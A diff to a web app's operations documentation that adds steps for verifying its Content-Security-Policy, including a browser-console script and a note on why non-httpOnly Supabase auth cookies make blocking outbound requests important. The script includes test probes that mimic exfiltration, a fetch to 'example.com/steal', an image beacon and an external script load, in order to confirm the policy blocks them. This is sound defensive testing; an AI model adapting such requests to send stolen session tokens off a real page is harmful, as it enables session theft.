@@ -662,6 +662,69 @@ returns `attempted: 0`.
 To be sure, look at the response *before* worrying: `attempted: 0` means nothing
 was generated and nothing was sent.
 
+### Verifying the Content-Security-Policy
+
+Worth re-running after any change to `next.config.mjs`, or after adding
+anything the browser loads from a new origin — a script, a font, an analytics
+snippet, an embedded widget. A CSP failure is quiet: the feature simply does
+not work, and only the console says why.
+
+**1. Is the header actually being sent?**
+
+```bash
+curl -sI https://www.fndrbrief.com/ | grep -i content-security-policy
+```
+
+**2. Does it allow what the app needs, and block what it should?**
+
+Open the site, then paste this into the browser console. It checks both
+directions, because a policy that blocks everything is as broken as one that
+blocks nothing:
+
+```js
+(async () => {
+  const r = {};
+  const supabase = "https://YOUR-PROJECT.supabase.co/auth/v1/health";
+  try { await fetch(supabase); r.supabase_auth = "allowed"; }
+  catch { r.supabase_auth = "BLOCKED - sign-in will not work"; }
+  try { await fetch("/api/settings", { method: "POST" }); r.same_origin = "allowed"; }
+  catch { r.same_origin = "BLOCKED - the app will not work"; }
+  try { await fetch("https://example.com/steal?t=1"); r.exfil_fetch = "ALLOWED - policy not enforcing"; }
+  catch { r.exfil_fetch = "blocked (correct)"; }
+  r.exfil_img = await new Promise(res => { const i = new Image();
+    i.onload = () => res("ALLOWED - policy not enforcing"); i.onerror = () => res("blocked (correct)");
+    i.src = "https://example.com/b.gif"; setTimeout(() => res("blocked (correct)"), 3000); });
+  r.external_script = await new Promise(res => { const el = document.createElement("script");
+    el.onload = () => res("ALLOWED - policy not enforcing"); el.onerror = () => res("blocked (correct)");
+    el.src = "https://example.com/e.js"; document.head.appendChild(el);
+    setTimeout(() => res("blocked (correct)"), 3000); });
+  return r;
+})()
+```
+
+Expected:
+
+| Key | Expected |
+|---|---|
+| `supabase_auth` | allowed — the browser client signs in against this origin |
+| `same_origin` | allowed |
+| `exfil_fetch` | blocked |
+| `exfil_img` | blocked |
+| `external_script` | blocked |
+
+The last three are the point: they are how a script that got onto the page
+would send a stolen session somewhere. `@supabase/ssr` sets auth cookies with
+`httpOnly: false`, so they are readable by JavaScript by design — which makes
+blocking the *outbound* path the control that matters.
+
+**3. Then walk the app** with the console open — landing, `/login`, `/preview`,
+and one signed-in page — and confirm no `Refused to…` errors. Sign-in is the
+only flow that talks off-origin, so it is the one a bad CSP breaks first.
+
+> Test it against a **production build** (`npm run build && npm start`), not
+> `npm run dev`. The dev policy is deliberately looser: HMR needs
+> `'unsafe-eval'` and a websocket, so dev will pass things production rejects.
+
 ### Smoke tests after a schedule change
 
 ```bash
@@ -734,6 +797,14 @@ little of that as possible.
   convenience.
 - Never expose `SUPABASE_SERVICE_ROLE_KEY`, `ENCRYPTION_KEY`, or integration
   tokens to the client.
+- **In the browser**, a Content-Security-Policy is set in `next.config.mjs`.
+  This matters more than it usually would: `@supabase/ssr` sets its auth cookies
+  with `httpOnly: false` — it must, because the login page reads the session in
+  the browser — so an XSS here is a session takeover rather than a defacement.
+  The policy allows inline script (the strict alternative forces every page to
+  render dynamically) but blocks the *exfiltration* half: a script that runs
+  cannot `fetch`, beacon, or post a stolen token anywhere off-origin. See
+  ARCHITECTURE › Content-Security-Policy for the trade and when to revisit it.
 - **Rotating `ENCRYPTION_KEY`:** do not just change it in Vercel. Every stored
   credential is encrypted with it and becomes permanently unreadable — the only
   recovery is asking every customer to reconnect. Follow the numbered runbook in
